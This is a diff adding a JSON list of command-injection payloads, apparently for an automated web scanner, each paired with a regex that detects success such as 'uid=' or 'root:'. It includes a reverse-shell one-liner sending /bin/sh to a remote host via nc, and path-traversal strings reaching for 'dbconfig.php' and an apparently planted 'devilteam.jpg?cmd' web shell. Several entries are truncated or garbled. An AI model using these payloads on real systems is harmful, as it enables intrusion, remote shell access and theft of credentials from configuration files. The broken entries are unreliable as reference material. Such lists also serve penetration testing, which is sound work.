@@ -1,0 +1,79 @@
+[
+  {
+    "payload_id": "OWP-57474",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "`echo $PATH | cut -c1`",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57475",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": ";cat /tmp/f|/bin/sh -i 2>&1|nc [ip address] 5555 >/tmp/f",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-57476",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "&wget http:`",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-59507",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "../../root/devilteam639/devilteam.jpg?cmd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-59508",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "../../root/devilteam639/devilteam.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-62587",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "; echo base64_encode($res); } '",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-64980",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "path_parameter",
+    "payload_string": "./../dbconfig.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  }
+]
